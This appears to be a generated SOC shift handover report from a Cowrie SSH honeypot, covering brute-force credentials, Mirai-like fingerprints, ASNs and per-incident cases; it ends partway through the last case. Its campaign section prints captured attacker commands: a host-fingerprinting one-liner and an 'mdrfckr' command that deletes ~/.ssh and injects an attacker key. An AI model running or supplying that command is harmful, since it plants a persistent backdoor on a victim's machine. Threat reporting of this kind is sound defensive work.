# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-02 |
| **Generated At** | 2026-07-02T17:53:46Z |
| **Shift Time** | 17:53 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **202** |
| Confirmed Threats | **191** |
| False Positives Filtered | **11** (5.5%) |
| Unique Attacker IPs | **63** |
| Countries of Origin | **21** |
| High Severity Cases | **143** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **59** |
| Malware Samples Analyzed | **3** HIGH · **38** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **167** |
| Unique Credential Pairs | **108** |
| Unique Usernames | **34** |
| Unique Passwords | **93** |
| Successful Auth Pairs | **150** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 88 |
| `345gs5662d34` | 25 |
| `ubuntu` | 9 |
| `bot` | 3 |
| `lghkel	` | 3 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 26 |
| `345gs5662d34` | 25 |
| `Host: 129.80.119.236:2323` | 6 |
| `LeitboGi0ro` | 4 |
| `123@@@` | 4 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 25 |
| `root` | `3245gs5662d34` | 19 |
| `root` | `LeitboGi0ro` | 4 |
| `root` | `123@@@` | 4 |
| `lghkel	` | `zpz}ld	` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `tradingbot` | `tradingbot` | `2.57.122.238` | 2026-07-02T12:55:48 |
| `root` | `12345678` | `195.178.110.227` | 2026-07-02T12:56:46 |
| `bot` | `bot` | `2.57.122.238` | 2026-07-02T12:57:28 |
| `root` | `7ujMko0admin` | `112.168.171.175` | 2026-07-02T12:58:26 |
| `b'\xd8\xca\xce'` | `b'\xd8\xca\xce'` | `112.168.171.175` | 2026-07-02T12:59:01 |
| `lghkel	` | `zpz}ld	` | `112.168.171.175` | 2026-07-02T12:59:02 |
| `bot` | `123456` | `2.57.122.238` | 2026-07-02T12:59:09 |
| `root` | `secreta1` | `10.0.0.73` | 2026-07-02T12:59:11 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-07-02T12:59:13 |
| `root` | `3245gs5662d34` | `10.0.0.73` | 2026-07-02T12:59:14 |
| `admin` | `motorola` | `112.168.171.175` | 2026-07-02T12:59:36 |
| `b'\xd9\xcb\xdb\xcd\xca'` | `b'\x8f\x8c\x8d\x8a\x8b'` | `112.168.171.175` | 2026-07-02T13:00:10 |
| `"??$` | ` 1##` | `112.168.171.175` | 2026-07-02T13:00:44 |
| `bot` | `12345` | `2.57.122.238` | 2026-07-02T13:00:45 |
| `root` | `Qwerty@1232wsx` | `45.198.224.120` | 2026-07-02T13:01:11 |
| `root` | `cat1029` | `112.168.171.175` | 2026-07-02T13:01:18 |
| `root` | `Qq12345678!@#` | `10.0.0.73` | 2026-07-02T13:01:35 |
| `admin` | `epicrouter` | `112.168.171.175` | 2026-07-02T13:01:52 |
| `root` | `xmhdipc` | `112.168.171.175` | 2026-07-02T13:02:26 |
| `b'\xdb\xc4\xda\xc8\xcc'` | `b'\xdb\xc4\xda\xc8\xcc'` | `112.168.171.175` | 2026-07-02T13:03:00 |
| `root` | `R@123456` | `10.0.0.73` | 2026-07-02T13:07:34 |
| `root` | `Pa$$w0rd` | `45.205.1.42` | 2026-07-02T13:08:21 |
| `root` | `123456789` | `195.178.110.227` | 2026-07-02T13:11:00 |
| `ubuntu` | `ubuntu1234567` | `45.198.224.120` | 2026-07-02T13:11:58 |
| `root` | `123qwe1` | `10.0.0.73` | 2026-07-02T13:18:48 |
| `root` | `P@sswd123` | `45.205.1.42` | 2026-07-02T13:22:25 |
| `root` | `Root-123` | `45.198.224.120` | 2026-07-02T13:22:59 |
| `root` | `amanda` | `185.242.3.195` | 2026-07-02T13:24:14 |
| `nasa123` | `nasa123` | `45.198.224.120` | 2026-07-02T13:34:20 |
| `root` | `Rcs_1234` | `45.205.1.42` | 2026-07-02T13:36:35 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-07-02T13:40:24 |
| `root` | `123@@@` | `64.110.90.250` | 2026-07-02T13:40:25 |
| `root` | `Apple@2026` | `83.168.107.158` | 2026-07-02T13:43:17 |
| `345gs5662d34` | `345gs5662d34` | `83.168.107.158` | 2026-07-02T13:43:19 |
| `root` | `3245gs5662d34` | `83.168.107.158` | 2026-07-02T13:43:20 |
| `root` | `bubbles` | `45.198.224.120` | 2026-07-02T13:45:32 |
| `root` | `flower` | `45.205.1.42` | 2026-07-02T13:50:53 |
| `root` | `Abc@123` | `45.198.224.120` | 2026-07-02T13:56:47 |
| `root` | `﻿------fuck------` | `10.0.0.73` | 2026-07-02T14:01:55 |
| `root` | `amanda` | `10.0.0.73` | 2026-07-02T14:04:54 |
| `web1` | `12345` | `45.205.1.42` | 2026-07-02T14:05:01 |
| `developer` | `admin123` | `156.232.13.161` | 2026-07-02T14:06:11 |
| `345gs5662d34` | `345gs5662d34` | `156.232.13.161` | 2026-07-02T14:06:13 |
| `developer` | `3245gs5662d34` | `156.232.13.161` | 2026-07-02T14:06:13 |
| `a` | `user` | `45.198.224.120` | 2026-07-02T14:08:09 |
| `ftpuser` | `password123` | `149.91.97.132` | 2026-07-02T14:08:14 |
| `345gs5662d34` | `345gs5662d34` | `149.91.97.132` | 2026-07-02T14:08:17 |
| `ftpuser` | `3245gs5662d34` | `149.91.97.132` | 2026-07-02T14:08:17 |
| `root` | `Secure@123` | `92.50.89.157` | 2026-07-02T14:17:45 |
| `345gs5662d34` | `345gs5662d34` | `92.50.89.157` | 2026-07-02T14:17:47 |
| `root` | `3245gs5662d34` | `92.50.89.157` | 2026-07-02T14:17:48 |
| `yhuang` | `yhuang` | `45.205.1.42` | 2026-07-02T14:19:34 |
| `oracle` | `Oracle123` | `45.198.224.120` | 2026-07-02T14:19:45 |
| `covers` | `covers` | `117.72.209.56` | 2026-07-02T14:20:27 |
| `root` | `qwe12345^&*` | `45.198.224.120` | 2026-07-02T14:31:24 |
| `ubuntu` | `!QAZ@WSX3edc4rfv` | `45.205.1.42` | 2026-07-02T14:34:53 |
| `root` | `qwe321` | `43.165.170.198` | 2026-07-02T14:36:13 |
| `345gs5662d34` | `345gs5662d34` | `43.165.170.198` | 2026-07-02T14:36:16 |
| `root` | `3245gs5662d34` | `43.165.170.198` | 2026-07-02T14:36:17 |
| `root` | `Help@123` | `14.103.112.56` | 2026-07-02T14:39:36 |
| `root` | `3245gs5662d34` | `14.103.112.56` | 2026-07-02T14:39:54 |
| `rashid` | `rashid` | `45.198.224.120` | 2026-07-02T14:43:10 |
| `admin` | `admin` | `120.48.75.127` | 2026-07-02T14:44:11 |
| `toolbox` | `toolbox` | `10.0.0.73` | 2026-07-02T14:48:24 |
| `toolbox` | `3245gs5662d34` | `10.0.0.73` | 2026-07-02T14:48:27 |
| `root` | `111111` | `80.94.92.55` | 2026-07-02T14:48:36 |
| `ubuntu` | `password55` | `45.205.1.42` | 2026-07-02T14:48:58 |
| `root` | `123123` | `80.94.92.55` | 2026-07-02T14:51:45 |
| `POST / HTTP/1.1` | `Host: 129.80.119.236:2323` | `160.119.71.92` | 2026-07-02T14:52:41 |
| `POST /_next HTTP/1.1` | `Host: 129.80.119.236:2323` | `160.119.71.92` | 2026-07-02T14:52:53 |
| `POST /api HTTP/1.1` | `Host: 129.80.119.236:2323` | `160.119.71.92` | 2026-07-02T14:53:06 |
| `POST /_next/server HTTP/1.1` | `Host: 129.80.119.236:2323` | `160.119.71.92` | 2026-07-02T14:53:18 |
| `POST /app HTTP/1.1` | `Host: 129.80.119.236:2323` | `160.119.71.92` | 2026-07-02T14:53:31 |
| `POST /api/route HTTP/1.1` | `Host: 129.80.119.236:2323` | `160.119.71.92` | 2026-07-02T14:53:43 |
| `root` | `Oracle@1234` | `45.198.224.120` | 2026-07-02T14:54:59 |
| `root` | `Qwerty@1234` | `162.243.147.237` | 2026-07-02T14:55:56 |
| `345gs5662d34` | `345gs5662d34` | `162.243.147.237` | 2026-07-02T14:55:58 |
| `root` | `3245gs5662d34` | `162.243.147.237` | 2026-07-02T14:55:58 |
| `prueba` | `prueba` | `185.242.3.195` | 2026-07-02T14:56:27 |
| `root` | `123698745` | `58.229.141.26` | 2026-07-02T14:59:01 |
| `345gs5662d34` | `345gs5662d34` | `58.229.141.26` | 2026-07-02T14:59:05 |
| `root` | `3245gs5662d34` | `58.229.141.26` | 2026-07-02T14:59:06 |
| `root` | `LeitboGi0ro` | `144.22.238.238` | 2026-07-02T15:00:42 |
| `root` | `123@@@` | `144.22.238.238` | 2026-07-02T15:00:42 |
| `root` | `smo@@kkklss` | `144.22.238.238` | 2026-07-02T15:00:47 |
| `upload` | `upload` | `45.205.1.42` | 2026-07-02T15:02:49 |
| `root` | `Qwerty` | `45.198.224.120` | 2026-07-02T15:06:24 |
| `root` | `QAZWSX123@` | `118.193.61.170` | 2026-07-02T15:08:57 |
| `345gs5662d34` | `345gs5662d34` | `118.193.61.170` | 2026-07-02T15:09:01 |
| `root` | `3245gs5662d34` | `118.193.61.170` | 2026-07-02T15:09:02 |
| `root` | `!@qwaszx` | `171.244.37.103` | 2026-07-02T15:11:53 |
| `345gs5662d34` | `345gs5662d34` | `171.244.37.103` | 2026-07-02T15:11:57 |
| `root` | `3245gs5662d34` | `171.244.37.103` | 2026-07-02T15:11:59 |
| `root` | `qwe12345^&` | `45.205.1.42` | 2026-07-02T15:16:43 |
| `ubuntu` | `P@ssword123` | `45.198.224.120` | 2026-07-02T15:18:05 |
| `root` | `123asd!` | `10.0.0.73` | 2026-07-02T15:20:39 |
| `root` | `nguyen123` | `165.154.6.75` | 2026-07-02T15:28:23 |
| `345gs5662d34` | `345gs5662d34` | `165.154.6.75` | 2026-07-02T15:28:27 |
| `root` | `3245gs5662d34` | `165.154.6.75` | 2026-07-02T15:28:28 |
| `root` | `Toor` | `45.198.224.120` | 2026-07-02T15:29:40 |
| `ubuntu` | `!qaz@WSX` | `45.205.1.42` | 2026-07-02T15:30:46 |
| `root` | `Qwer123456` | `190.223.60.209` | 2026-07-02T15:34:24 |
| `345gs5662d34` | `345gs5662d34` | `190.223.60.209` | 2026-07-02T15:34:27 |
| `root` | `3245gs5662d34` | `190.223.60.209` | 2026-07-02T15:34:28 |
| `root` | `1234567890Ab` | `46.59.122.78` | 2026-07-02T15:34:55 |
| `345gs5662d34` | `345gs5662d34` | `46.59.122.78` | 2026-07-02T15:34:57 |
| `root` | `3245gs5662d34` | `46.59.122.78` | 2026-07-02T15:34:58 |
| `prueba` | `prueba` | `10.0.0.73` | 2026-07-02T15:36:47 |
| `root` | `P@ssw0rd123!` | `45.198.224.120` | 2026-07-02T15:41:04 |
| `student` | `student` | `217.160.49.114` | 2026-07-02T15:43:08 |
| `345gs5662d34` | `345gs5662d34` | `217.160.49.114` | 2026-07-02T15:43:11 |
| `student` | `3245gs5662d34` | `217.160.49.114` | 2026-07-02T15:43:11 |
| `root` | `root01` | `45.205.1.42` | 2026-07-02T15:45:05 |
| `root` | `123456789a` | `45.198.224.120` | 2026-07-02T15:52:24 |
| `root` | `quartz` | `45.205.1.42` | 2026-07-02T15:59:33 |
| `root` | `Welc0me` | `49.238.167.125` | 2026-07-02T16:02:06 |
| `345gs5662d34` | `345gs5662d34` | `49.238.167.125` | 2026-07-02T16:02:09 |
| `root` | `3245gs5662d34` | `49.238.167.125` | 2026-07-02T16:02:11 |
| `root` | `qwer` | `45.198.224.120` | 2026-07-02T16:03:49 |
| `zope` | `zope123` | `152.200.181.42` | 2026-07-02T16:12:27 |
| `345gs5662d34` | `345gs5662d34` | `152.200.181.42` | 2026-07-02T16:12:30 |
| `zope` | `3245gs5662d34` | `152.200.181.42` | 2026-07-02T16:12:32 |
| `root` | `Oracle123` | `45.205.1.42` | 2026-07-02T16:13:44 |
| `mv` | `mv123` | `121.122.119.214` | 2026-07-02T16:15:19 |
| `ftpadmin` | `ftpadmin` | `45.198.224.120` | 2026-07-02T16:15:23 |
| `345gs5662d34` | `345gs5662d34` | `121.122.119.214` | 2026-07-02T16:15:23 |
| `mv` | `3245gs5662d34` | `121.122.119.214` | 2026-07-02T16:15:25 |
| `ubuntu` | `ubuntupassword` | `43.247.250.115` | 2026-07-02T16:17:00 |
| `345gs5662d34` | `345gs5662d34` | `43.247.250.115` | 2026-07-02T16:17:04 |
| `ubuntu` | `3245gs5662d34` | `43.247.250.115` | 2026-07-02T16:17:06 |
| `ubuntu` | `ZAQ!xsw2` | `45.198.224.120` | 2026-07-02T16:26:45 |
| `user` | `123` | `45.205.1.42` | 2026-07-02T16:27:42 |
| `root` | `1q2w3e4r5` | `185.242.3.195` | 2026-07-02T16:28:12 |
| `root` | `123@@@` | `129.153.145.135` | 2026-07-02T16:34:48 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-07-02T16:34:49 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-07-02T16:34:59 |
| `root` | `123.com.cn` | `174.35.25.177` | 2026-07-02T16:37:16 |
| `345gs5662d34` | `345gs5662d34` | `174.35.25.177` | 2026-07-02T16:37:17 |
| `root` | `3245gs5662d34` | `174.35.25.177` | 2026-07-02T16:37:17 |
| `ubuntu` | `dev123` | `45.198.224.120` | 2026-07-02T16:38:13 |
| `root` | `12345678901` | `45.205.1.42` | 2026-07-02T16:41:40 |
| `root` | `Abcd12345.` | `139.59.208.49` | 2026-07-02T16:44:36 |
| `345gs5662d34` | `345gs5662d34` | `139.59.208.49` | 2026-07-02T16:44:39 |
| `root` | `3245gs5662d34` | `139.59.208.49` | 2026-07-02T16:44:40 |
| `root` | `111111` | `92.118.39.50` | 2026-07-02T16:47:40 |
| `root` | `123` | `92.118.39.50` | 2026-07-02T16:49:24 |
| `root` | `P@ssw0rd@123` | `45.198.224.120` | 2026-07-02T16:50:00 |
| `root` | `123123` | `92.118.39.50` | 2026-07-02T16:51:08 |
| `root` | `123321` | `92.118.39.50` | 2026-07-02T16:52:53 |
| `root` | `1234` | `92.118.39.50` | 2026-07-02T16:54:35 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **202** |
| Sessions with Fingerprint | **9** |
| Unique HASSH Fingerprints | **9** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 84 |
| Go SSH scanner | 56 |
| Paramiko (Python) | 11 |
| PuTTY | 1 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 72 | 25 |
| `16443846184e...` | Generic scanner | 46 | 4 |
| `a2de0f306611...` | Mirai/variant | 11 | 3 |
| `2ec37a7cc8da...` | Mirai/variant | 9 | 3 |
| `5bd26477da54...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 72 | 25 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 46 | 4 | Generic scanner |
| `a2de0f306611...` | Paramiko (Python) | 11 | 3 | Mirai/variant |
| `95420f9d932d...` | libssh | 11 | 6 | — |
| `2ec37a7cc8da...` | Go SSH scanner | 9 | 3 | Mirai/variant |
| `5bd26477da54...` | PuTTY | 1 | 1 | Mirai/variant |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `03a80b21afa8...` | libssh | 1 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **14** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 7 | 2 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 20 | 20 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `80.94.92.55`, `92.118.39.50`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `149.91.97.132`, `171.244.37.103`, `92.50.89.157`, `190.223.60.209`, `46.59.122.78`, `49.238.167.125`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **63** |
| Unique ASNs | **45** |
| High-Risk ASNs | **41** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS63949` | Akamai Connected Cloud | 6 | HIGH |
| `AS47890` | UNMANAGED LTD | 4 | HIGH |
| `AS14061` | DigitalOcean, LLC | 3 | HIGH |
| `AS31898` | Oracle Corporation | 3 | HIGH |
| `AS4811` | China Telecom (Group) | 2 | HIGH |
| `AS135377` | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | 2 | HIGH |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 2 | HIGH |
| `AS48090` | TECHOFF SRV LIMITED | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (143)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-99bc861d3b74

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-02 12:55 |
| **Last Seen** | 2026-07-02 12:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 12:55:47` | `cowrie.session.connect` |
| `2026-07-02 12:55:47` | `cowrie.client.version` |
| `2026-07-02 12:55:47` | `cowrie.client.kex` |
| `2026-07-02 12:55:48` | `cowrie.login.success` |
| `2026-07-02 12:55:48` | `cowrie.session.params` |
| `2026-07-02 12:55:48` | `cowrie.command.input` |
| `2026-07-02 12:55:49` | `cowrie.log.closed` |
| `2026-07-02 12:55:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9561cd1528d8

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-02 12:56 |
| **Last Seen** | 2026-07-02 12:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo $HOME` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 12:56:46` | `cowrie.session.connect` |
| `2026-07-02 12:56:46` | `cowrie.client.version` |
| `2026-07-02 12:56:46` | `cowrie.client.kex` |
| `2026-07-02 12:56:46` | `cowrie.login.success` |
| `2026-07-02 12:56:48` | `cowrie.session.params` |
| `2026-07-02 12:56:48` | `cowrie.command.input` |
| `2026-07-02 12:56:48` | `cowrie.log.closed` |
| `2026-07-02 12:56:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8fdbff14a472

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-02 12:57 |
| **Last Seen** | 2026-07-02 12:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 12:57:28` | `cowrie.session.connect` |
| `2026-07-02 12:57:28` | `cowrie.client.version` |
| `2026-07-02 12:57:28` | `cowrie.client.kex` |
| `2026-07-02 12:57:28` | `cowrie.login.success` |
| `2026-07-02 12:57:29` | `cowrie.session.params` |
| `2026-07-02 12:57:29` | `cowrie.command.input` |
| `2026-07-02 12:57:29` | `cowrie.log.closed` |
| `2026-07-02 12:57:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8f8a8bd718c

| Field | Detail |
|---|---|
| **Source IP** | `112.168.171[.]175` |
| **First Seen** | 2026-07-02 12:58 |
| **Last Seen** | 2026-07-02 12:59 |
| **Session Duration** | 34s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 12:58:25` | `cowrie.session.connect` |
| `2026-07-02 12:58:26` | `cowrie.login.success` |
| `2026-07-02 12:58:27` | `cowrie.session.params` |
| `2026-07-02 12:58:27` | `cowrie.command.input` |
| `2026-07-02 12:58:27` | `cowrie.command.failed` |
| `2026-07-02 12:58:27` | `cowrie.command.input` |
| `2026-07-02 12:58:27` | `cowrie.command.failed` |
| `2026-07-02 12:58:28` | `cowrie.command.input` |
| `2026-07-02 12:58:28` | `cowrie.command.failed` |
| `2026-07-02 12:58:28` | `cowrie.command.input` |
| `2026-07-02 12:58:28` | `cowrie.command.failed` |
| `2026-07-02 12:58:29` | `cowrie.command.input` |
| `2026-07-02 12:58:29` | `cowrie.command.input` |
| `2026-07-02 12:58:29` | `cowrie.command.failed` |
| `2026-07-02 12:58:29` | `cowrie.command.failed` |
| `2026-07-02 12:59:00` | `cowrie.log.closed` |
| `2026-07-02 12:59:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.168.171[.]175` to AbuseIPDB if not already reported
- [ ] Block `112.168.171[.]175` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b71268564bec

| Field | Detail |
|---|---|
| **Source IP** | `112.168.171[.]175` |
| **First Seen** | 2026-07-02 12:59 |
| **Last Seen** | 2026-07-02 12:59 |
| **Session Duration** | 33s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `zalee, za, &k`g&k|zpkfq)ES[M, g & k | zpkfq` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 12:59:00` | `cowrie.session.connect` |
| `2026-07-02 12:59:01` | `cowrie.login.success` |
| `2026-07-02 12:59:02` | `cowrie.login.success` |
| `2026-07-02 12:59:02` | `cowrie.session.params` |
| `2026-07-02 12:59:03` | `cowrie.command.input` |
| `2026-07-02 12:59:03` | `cowrie.command.failed` |
| `2026-07-02 12:59:03` | `cowrie.command.input` |
| `2026-07-02 12:59:03` | `cowrie.command.failed` |
| `2026-07-02 12:59:03` | `cowrie.command.input` |
| `2026-07-02 12:59:03` | `cowrie.command.input` |
| `2026-07-02 12:59:03` | `cowrie.command.failed` |
| `2026-07-02 12:59:03` | `cowrie.command.failed` |
| `2026-07-02 12:59:34` | `cowrie.log.closed` |
| `2026-07-02 12:59:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.168.171[.]175` to AbuseIPDB if not already reported
- [ ] Block `112.168.171[.]175` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ac9c43a43aa

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-02 12:59 |
| **Last Seen** | 2026-07-02 12:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 12:59:09` | `cowrie.session.connect` |
| `2026-07-02 12:59:09` | `cowrie.client.version` |
| `2026-07-02 12:59:09` | `cowrie.client.kex` |
| `2026-07-02 12:59:09` | `cowrie.login.success` |
| `2026-07-02 12:59:10` | `cowrie.session.params` |
| `2026-07-02 12:59:10` | `cowrie.command.input` |
| `2026-07-02 12:59:10` | `cowrie.log.closed` |
| `2026-07-02 12:59:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7476b82d831d

| Field | Detail |
|---|---|
| **Source IP** | `112.168.171[.]175` |
| **First Seen** | 2026-07-02 12:59 |
| **Last Seen** | 2026-07-02 13:00 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 12:59:35` | `cowrie.session.connect` |
| `2026-07-02 12:59:36` | `cowrie.login.success` |
| `2026-07-02 12:59:36` | `cowrie.session.params` |
| `2026-07-02 12:59:37` | `cowrie.command.input` |
| `2026-07-02 12:59:37` | `cowrie.command.failed` |
| `2026-07-02 12:59:37` | `cowrie.command.input` |
| `2026-07-02 12:59:37` | `cowrie.command.failed` |
| `2026-07-02 12:59:37` | `cowrie.command.input` |
| `2026-07-02 12:59:37` | `cowrie.command.failed` |
| `2026-07-02 12:59:38` | `cowrie.command.input` |
| `2026-07-02 12:59:38` | `cowrie.command.failed` |
| `2026-07-02 12:59:38` | `cowrie.command.input` |
| `2026-07-02 12:59:38` | `cowrie.command.input` |
| `2026-07-02 12:59:38` | `cowrie.command.failed` |
| `2026-07-02 12:59:38` | `cowrie.command.failed` |
| `2026-07-02 13:00:09` | `cowrie.log.closed` |
| `2026-07-02 13:00:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.168.171[.]175` to AbuseIPDB if not already reported
- [ ] Block `112.168.171[.]175` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d313d925fe09

| Field | Detail |
|---|---|
| **Source IP** | `112.168.171[.]175` |
| **First Seen** | 2026-07-02 13:00 |
| **Last Seen** | 2026-07-02 13:00 |
| **Session Duration** | 33s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `zalee, za, &k`g&k|zpkfq)ES[M, g & k | zpkfq` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 13:00:09` | `cowrie.session.connect` |
| `2026-07-02 13:00:10` | `cowrie.login.success` |
| `2026-07-02 13:00:10` | `cowrie.login.success` |
| `2026-07-02 13:00:11` | `cowrie.session.params` |
